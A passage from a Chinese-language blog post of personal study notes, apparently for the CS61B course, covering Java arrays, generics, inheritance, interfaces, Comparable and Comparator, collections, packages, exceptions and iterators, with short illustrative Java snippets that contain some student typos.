else进行抉择</li><li>私用哨兵节点</li></ol></li><li>解释：一个入口，可以避免特殊情况进行实现</li></ol></li><li>不变量Invariant<ol><li>不变量（Invariant） 是指在特定操作或一系列操作过程中始终保持为真的陈述或条件</li><li>可以是设计上的要求，也可以是思路上的实现，抓住这几个就不会错，概念问题</li></ol></li></ol><h3 id="2-3-DLLists-Arrays"><a href="#2-3-DLLists-Arrays" class="headerlink" title="2. 3 DLLists, Arrays"></a>2. 3 DLLists, Arrays</h3><ol><li><strong>SLList的缺点</strong><ol><li>即使添加Invariant _last还是很难removeLast()，因为难以找到前一个指向它的点，是Single单向的</li></ol></li><li>DLList<ol><li><strong>哨兵节点</strong><ol><li>double sentinel:夹在中间</li><li>circular sentinel approach:变成环状，前后哨兵指向同一个</li><li>具体实现——project1</li></ol></li></ol></li><li><strong>Generic泛型</strong><ol><li>泛型只适用于引用类型，不能将int&#x2F;double而是应该适用引用版本Integer等——要在基元类型上实例化泛型，请使用 Integer、Double、Character、Boolean、Long、Short、Byte 或 Float 而不是它们的基元等效项</li><li>详见project1会的</li></ol></li><li>Array<ol><li><p>三种创建方式——可以直接省略new，但是长度由元素定，适用{}</p></li><li><p>Java 数组仅在运行时执行边界检查。也就是说，以下代码编译良好，但在运行时会崩溃</p></li><li><p>复制数组</p><ol><li><code>System.arraycopy(b,0,x,3,2);</code></li><li>适用for循环进行赋值</li></ol></li><li><p><strong>2D array</strong></p><ol><li><p>java中的引用都是copy，值不同，copy的值也不同，包括内容，比如</p><ol><li>java中二维数组在高纬度也是存储数组对象的地址(对对象使用引用)</li><li>此处row0最终还是null是因为一开始test[0]处存储的地址是null而不是后续new出来的地址，故row0一直为null</li><li>row02中就会随改变2而改变</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dArrayTest</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="type">int</span>[][] test;</span><br><span class="line">   test = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">4</span>][];</span><br><span class="line">   <span class="type">int</span>[] row0 = test[<span class="number">0</span>];</span><br><span class="line">   test[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">1</span>&#125;;</span><br><span class="line">   <span class="type">int</span>[] row02 = test[<span class="number">0</span>];</span><br><span class="line">   test[<span class="number">0</span>][<span class="number">0</span>] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>反射：可以在运行时指定所需的字段<a href="https://docs.oracle.com/javase/tutorial/reflect/member/fieldValues.html">资料</a></p></li><li><p>the maximum number of array boxes that Java will track at any given time——Java虚拟机(JVM)并没有对数组盒子（array boxes）跟踪数量设定硬性限制，但是数组的大小受到JVM可用内存和平台的限制。由于数组的索引是int类型，理论上数组可以有的最大元素数量是2^31 - 1，即2,147,483,647个元素。然而，实际上，创建数组时可能会受到JVM设置的限制，比如可以使用的堆内存大小，或者JVM对数组大小的内部限制</p></li></ol></li></ol><h3 id="2-4-ALists-Resizing"><a href="#2-4-ALists-Resizing" class="headerlink" title="2. 4 ALists, Resizing"></a>2. 4 ALists, Resizing</h3><ol><li>ALists<ol><li>Resizing:(好像是false的)<img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/Resizing.jpg" alt="math prove"><ol><li>变大的同时也要变小，减小内存浪费</li><li>变小使用usage ratio&#x3D;size&#x2F;arrsize</li></ol></li></ol></li><li>Generic AList<ol><li>Problem1:无法直接创建泛型对象的数组<ol><li>Reason:Java在编译时会进行类型擦除，即泛型类型信息在编译后被移除，运行时Java无法确保泛型数组的类型安全，因此禁止直接创建泛型数组</li><li>Solution:<code>T[] items = (T[])new Object[8];</code>创建一个Object类型的数组，然后将其强制转换为泛型类型的数组—未经检查的强制转换”警告，因为编译器无法验证这种转换的安全性。尽管如此，在需要使用泛型数组的情况下，这种方法是Java中常见的解决方案</li></ol></li><li>Problem2:防止“悬空对象”(Loitering)<ol><li><p>Reason:在Java中，当对象不再被引用时，垃圾回收器会自动销毁这些对象。如果你在删除数组元素后没有将其引用设置为null，该对象仍然在内存中有引用，垃圾回收器就不会回收它</p></li><li><p>Solution</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Stack</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Integer[] elements;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Stack</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        elements = <span class="keyword">new</span> <span class="title class_">Integer</span>[capacity];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> value)</span> &#123;</span><br><span class="line">        elements[size++] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Integer <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Stack is empty&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 注意：这里我们没有将弹出的元素设置为null</span></span><br><span class="line">        <span class="keyword">return</span> elements[--size];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Stack</span> <span class="variable">stack</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Stack</span>(<span class="number">10</span>);</span><br><span class="line">        stack.push(<span class="number">1</span>);</span><br><span class="line">        stack.push(<span class="number">2</span>);</span><br><span class="line">        stack.push(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        stack.pop(); <span class="comment">// 弹出3</span></span><br><span class="line">        stack.pop(); <span class="comment">// 弹出2</span></span><br><span class="line">        <span class="comment">// 虽然2和3已经弹出，但它们仍然保留在数组中，无法被垃圾回收</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 解决方法 */</span></span><br><span class="line"><span class="keyword">public</span> Integer <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Stack is empty&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">value</span> <span class="operator">=</span> elements[--size];</span><br><span class="line">    elements[size] = <span class="literal">null</span>; <span class="comment">// 将弹出的元素引用设置为null</span></span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h2 id="3-Futher-Java-Feature"><a href="#3-Futher-Java-Feature" class="headerlink" title="3. Futher Java Feature"></a>3. Futher Java Feature</h2><h3 id="3-1-Inheritance-Implements"><a href="#3-1-Inheritance-Implements" class="headerlink" title="3. 1 Inheritance, Implements"></a>3. 1 Inheritance, Implements</h3><ol><li>Reason:method overloading is ugly and inconvenient</li><li>接口：一个合同，指定了列表必须能够做什么，但它没有为这些行为提供任何实现<ol><li>@Override为重写tag，会在编译时补充错误信息，如果getLast()写出getLsat()会报错</li></ol></li><li><strong>default和override方法</strong>，java使用dynamic method selection—当 Java 运行一个被覆盖的方法时，它会在其动态类型中搜索适当的方法签名并运行它，但是并不适用于重载overload而是override<ol><li>在重载overload中，只会检查静态类型</li></ol></li><li>interface inheritance &amp;&amp; implementation inheritance<ol><li><strong>接口继承</strong>指的是一个接口可以继承另一个或多个接口。这允许接口扩展或包含其他接口中定义的方法和常量——接口允许多继承</li><li><strong>实现继承</strong>指的是一个类继承另一个类，从而获得其属性和方法。这是类之间的一种“是一个（is-a）”关系——类只能单继承</li></ol></li><li><strong>潜在问题</strong>:<ol><li>如果两个接口给出冲突的默认方法，无法自动调用，需要手动处理——override、显式选择、合并</li></ol></li><li><strong>实践出真知</strong><ol><li>接口只可以调用接口的方法，如果想要在接口中访问实现该接口类的变量，需要适用get()方法</li><li>泛型接口只能由泛型类进行实现</li></ol></li></ol><h3 id="3-2-Extends-Casting-Higher-Order-Functions"><a href="#3-2-Extends-Casting-Higher-Order-Functions" class="headerlink" title="3. 2 Extends, Casting, Higher Order Functions"></a>3. 2 Extends, Casting, Higher Order Functions</h3><ol><li><p>extends(使用VengefulSLList说明):继承，子类将继承父类的全部成员(包括嵌套类)</p><ol><li><p>使用super.来使用直接父类方法——NOTICE:Java没有多类继承(没有父类的父类)</p><ol><li>solution:接口&#x2F;低层-&gt;高层转换</li></ol></li><li><p>构造函数无法继承，但 Java 要求所有构造函数都必须从调用其超类的构造函数之一开始——可以指定你想要的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">VenegefulSLList</span><span class="params">()</span>&#123;</span><br><span class="line">   <span class="built_in">super</span>(); <span class="comment">// 如果不调用则java自动为我们调用超类的无参数构造函数</span></span><br><span class="line">   <span class="comment">// ... </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>The Object Class</p><ol><li>Java 中的每个类都是 Object 类的后代，或者是 Object 类的扩展。即使在其类中没有显式扩展的类，也仍然隐式扩展 Object 类</li><li>通用方法<ol><li>equals(Object obj)：用于比较两个对象是否相等</li><li>hashCode()：返回对象的哈希码，通常与equals()方法配合使用</li><li>toString()：返回对象的字符串表示，通常用于调试</li><li>clone()：创建并返回对象的一个副本</li></ol></li><li>提供放射&#x2F;序列化功能</li></ol></li><li><p>Encapsulation 封装</p><ol><li>modular, interchangeable</li><li>“Design for change”</li><li>hiding information</li><li>NOTICE:How Inheritance Breaks Encapsulation<ol><li>内部对外隐藏了细节但是实现互相调用可能导致死循环</li></ol></li></ol></li><li><p>Type Checking and Casting</p><ol><li>Type Checking<ol><li>编译器进行的是静态的检查，不会允许向下的类型转换</li></ol></li><li>Casting<ol><li>强制转换—告诉编译器特定表达式具有特定的编译时类型</li><li>这是一个危险的东西</li></ol></li></ol></li><li><p>Higher Order Functions 高阶函数</p><ol><li>before java 8<ol><li><p>java8以前没有函数类型，需要借助接口和类来实现—接口是Java中的一等公民，是引用类型的一个例子。这意味着接口类型的对象可以被变量引用、传递给方法、作为返回值等</p></li><li><p>java接口本身不能被直接实例化。接口是引用类型，但它仅包含抽象方法(除非是默认方法或静态方法，这些可以在Java 8及以后版本中定义在接口中)和常量(不可以是实例变量)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** IIntUnaryFunction.java */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IntUnaryFunction</span>&#123;</span><br><span class="line">   <span class="type">int</span> <span class="title function_">apply</span><span class="params">(<span class="type">int</span> x)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Tenx.java */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Tenx</span> <span class="keyword">implements</span> <span class="title class_">IntUnaryFunction</span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">apply</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> x*<span class="number">10</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** HOF.java (anything, just for test)*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HOF</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">do_twice</span><span class="params">(IntUnaryFunction f, <span class="type">int</span> value)</span>&#123;</span><br><span class="line">      <span class="keyword">return</span> f.apply(f.apply(value));</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">      <span class="type">IntUnaryFunction</span> <span class="variable">tenx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Tenx</span>();</span><br><span class="line">      System.out.println(do_twice(tenx,value));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h3 id="3-3-Subtype-Polymorphism-vs-HoFs"><a href="#3-3-Subtype-Polymorphism-vs-HoFs" class="headerlink" title="3. 3 Subtype Polymorphism vs. HoFs"></a>3. 3 Subtype Polymorphism vs. HoFs</h3><ol><li>Subtype polymorphism，也称为静态多态性或包含多态性，允许一个引用类型可以指向其任何子类型的对象。这种多态性在编译时就已经确定，因此得名“静态”</li><li>Problem1:类似于&gt;号比较符号无法对所有类型成立，比如String，无法直接在<code>public static Object max(Object[] items)</code>中进行<code>items[i] &gt; items[maxDex]</code>的比较<ol><li>Solution:使用interface的继承来实现<ol><li>详见idea代码DSAImplement的…SP和…SP1</li><li>…SP不完美——需要强制转换；没有耦合好(built-in interface)</li><li>…SP1利用所有已经存在的库并使用 Comparable</li><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/comparable.png" alt="comparable"></li></ol></li><li>对于java，已经内置实现了Comparable</li></ol></li><li>Problem2:如何使用多种顺序来进行比较?——Comparator in java(built-in)<ol><li>回调概念：有时候，一个函数可能需要另一个函数的帮助来完成它的任务，而这个帮助函数可能还没有被编写（例如，一个比较最大值的函数可能需要compareTo方法）。所谓的回调函数就是提供帮助的那个函数（在这个场景中是compareTo）——此处是回调是因为当Arrays.sort()或类似的排序方法被调用时，它们会使用传递给它们的Comparator实例的compare方法来确定元素的顺序</li></ol></li><li><strong>SUM UP总结一下</strong><ol><li><p>子类多态:强调的是子类对象可以被当作父类对象来处理，而具体的行为则由子类的实际类型决定——和运行时多态(Runtime Polymorphism)这两个术语在面向对象编程中经常被提及，它们描述了多态性的不同方面，但通常指的是相同的概念(可以互换)</p></li><li><p>Interface Compare和Interface Comparator都是Java中built-in的比较&#x2F;排序接口——二者都是泛型</p><ol><li><p>Comparable接口用于让类的对象具有“自然顺序”（Natural Ordering）——适合在一个类中实现一个默认的排序逻辑（如按分数排序）</p><ol><li>通过实现类的对象使用的</li><li>找到最大值可以用父类Comparable来作为引用，后续再强制转换，也可以利用T，后面再讲</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 接口是什么样的 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Comparable</span>&lt;T&gt;&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(T obj)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** How to use? */</span></span><br><span class="line"><span class="comment">// 1. 实现接口</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassName</span> <span class="keyword">implements</span> <span class="title class_">Comparabel</span>&lt;T&gt; &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">   <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(T obj)</span>&#123;</span><br><span class="line">      <span class="comment">// 自定义逻辑...</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 2. 可以根据此排序来实现其他功能比如找到最大值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Maximizer</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> Comparable <span class="title function_">max</span><span class="params">(Comparable[] items)</span>&#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3. 最终使用 main function 中</span></span><br><span class="line"><span class="type">Dog</span> <span class="variable">d</span> <span class="operator">=</span> (Dog) Maximizer.max(dogs);</span><br><span class="line">   <span class="comment">// 如果不要强制转换的方式可以问gpt</span></span><br></pre></td></tr></table></figure></li><li><p>Comparator接口用于定义多个排序规则，或者在无法修改类时定义排序规则。你可以创建不同的Comparator实现来定义不同的排序逻辑</p><ol><li>通过omparator对象自定义比较顺序和使用的</li><li>常常使用静态嵌套类</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** 接口是什么样的 */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Comparator</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span>;</span><br><span class="line">&#125;            </span><br><span class="line"></span><br><span class="line"><span class="comment">/** How to use */</span></span><br><span class="line"><span class="comment">// 1. 导入包</span></span><br><span class="line"><span class="keyword">import</span> java.util.Comparator</span><br><span class="line"><span class="comment">// 2. 进行实现</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClassName</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">NameComparator</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>&lt;T&gt;&#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compara</span><span class="params">(ClassName o1, ClassName o2)</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3. 使用 main function 中</span></span><br><span class="line"><span class="type">NameComparator</span> <span class="variable">nc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NameComparator</span>();</span><br><span class="line"><span class="keyword">if</span>(nc.compare(o1,o2))&#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>一般不进行实现自己的OurCompare，因为已经有现成的了，整合性和耦合性高——集成到Collection.sort(dogs)之类的</p></li></ol></li></ol><h3 id="3-4-Java-Packages-and-Library-gitbook"><a href="#3-4-Java-Packages-and-Library-gitbook" class="headerlink" title="3. 4 Java Packages and Library(gitbook)"></a>3. 4 Java Packages and Library(gitbook)</h3><ol><li><p>Java Libraries</p><ol><li><p>Java 具有某些内置的 Abstract 数据类型可供您使用。它们都打包在 Java 库中</p></li><li><p>List(ArrayList), Set(HashSet), Map(HashMap) 三个重要的adts都在java.util中</p><ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/collection_hierarchy.png" alt="collection"></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** How to Use them? */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. List, in Words.java</span></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; <span class="title function_">getWords</span><span class="params">(String input_filename)</span>&#123;</span><br><span class="line">   List&lt;String&gt; lst = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">   <span class="type">In</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">In</span>(); <span class="comment">// 特殊语法</span></span><br><span class="line">   <span class="keyword">while</span>(!in.isEmpty())&#123;</span><br><span class="line">      lst.add(in.readString());</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> lst;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Set, in Words.java</span></span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">countUnique</span><span class="params">(List&lt;String&gt; words)</span>&#123;</span><br><span class="line">   Set&lt;String&gt; ss = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">   <span class="keyword">for</span> (String s : words) &#123;</span><br><span class="line">      ss.add(s);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> ss.size();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Map, in Words.java</span></span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map&lt;String, Integer&gt; <span class="title function_">collectWordsCount</span><span class="params">(List&lt;String&gt; words)</span>&#123;</span><br><span class="line">   Map&lt;String, Integer&gt; counts = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">for</span> (String s: target) &#123;</span><br><span class="line">      counts.put(s, <span class="number">0</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (String s: words) &#123;</span><br><span class="line">      <span class="keyword">if</span> (counts.contain(s))&#123;</span><br><span class="line">         counts.put(word,counts.get(s)+<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> counts;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>Interface and Abstract Class</p><ol><li>Interface品质：公开、无法实例化、无默认实现的方法都是抽象的</li><li>抽象类：可以具有成员变量、方法可公共可私有、默认方法具体除非抽象、不可以实例化</li><li>区别<ol><li>抽象类可以有构造方法。接口不能有构造方法</li><li>一个类只能继承一个抽象类（单继承）。一个类可以实现多个接口（多继承）</li><li>抽象类中的成员可以有各种访问修饰符，如public、protected、private等。接口中的成员默认是public的，不能使用其他访问修饰符</li><li>接口是“can-do”，抽象类是“is-a”</li></ol></li></ol></li><li><p>Package</p><ol><li>概念：在Java中，包（Package）是一种组织和管理类的方式，它有助于将功能相关的类和接口组织在一起，形成逻辑上的分组—包提供了一种命名空间，使得不同包中的类可以使用相同的名称而不会发生冲突</li><li>使用import导入包，在.java文件顶部声明package(一般对应目录结构)</li><li><strong>默认包</strong>：没有显式声明的文件都在默认包中<ol><li>Notice:无法导入默认包中的代码，并且可能会意外地在默认包下创建具有相同名称的类</li></ol></li><li>package特点<ol><li>包的可见性：包中的类默认是包级私有的，这意味着它们只能在同一个包中被访问</li><li>包的层次结构：包可以有层次结构，例如com.example.myapp.utils表示com.example.myapp包下的一个子包</li></ol></li></ol></li></ol><h3 id="3-5-Exceptions-Iterators-Object-Methods"><a href="#3-5-Exceptions-Iterators-Object-Methods" class="headerlink" title="3. 5 Exceptions, Iterators, Object Methods"></a>3. 5 Exceptions, Iterators, Object Methods</h3><ol><li>Throwing Exceptions<ol><li><img src="/pic/CS61B%E5%B0%8F%E7%BB%9321/checked_exceptions.png" alt="异常种类"></li><li>java中的异常是对象<code>throw new someExceptions();</code></li><li>当一个异常发生时，如果它被正确地捕获并处理，程序可以继续执行；如果一个异常没有被处理，它将向上传播到调用栈，直到被处理或到达主方法（main 方法），此时程序将终止</li></ol></li><li>Iterators<ol><li>几乎所有实现了 Collection 接口的类（如 List、Set 等）都实现了Iterator接口<ol><li>java.lang中的iterable&lt;T&gt;指定了一个方法iterator()</li><li>java.util中的iterator&lt;T&gt;指定了hasNext()和next()两种方法</li></ol></li><li>for增强型语句会使用iterator，可以通过覆写给定的接口来自定义</li><li>注意点<ol><li>通过iterator()获取内部private嵌套类</li><li>自己implement iterator&lt;T&gt;时的ArraySet无需泛型，这里就是一个自定义的类型</li></ol></li><li>代码见MyIterable</li></ol></li><li>Object Methods<ol><li><p>toString()</p><ol><li>System.out.println（） 函数在传递给它的任何对象上隐式调用此方法，并打印返回的字符串</li><li>我们可以进行覆写!——使用StringBulider就很好了，bouns中的不太好，但是可以作为<code>String.join()</code>的参考<code>return String(&quot;, &quot;,my_list);</code>返回的是一个String</li></ol></li><li><p>equal()</p><ol><li><p>&#x3D;&#x3D;与!&#x3D;对基元primitives检查值是否相等，对引用检查地址是否相等，所以需要equal()</p></li><li><p>一些规则</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 1. 等价：反身，对称，传递</span></span><br><span class="line"><span class="comment"> * 2. x.equals(null)必须返回null，自己null检查</span></span><br><span class="line"><span class="comment"> * 3. 类型转换</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>getClass()</p><ol><li><p>直接上使用代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取类的全名（包括包名）</span></span><br><span class="line">Class&lt;?&gt; class_type = myobj.getClass();</span><br><span class="line">System.out.println(class_type.getName())</span><br><span class="line"></span><br><span class="line"><span class="comment">// 进行比较</span></span><br><span class="line"><span class="keyword">if</span> (class_type.equals(obj.getClass())) &#123;</span><br><span class="line">   <span class="comment">// ...</span></span><br><span 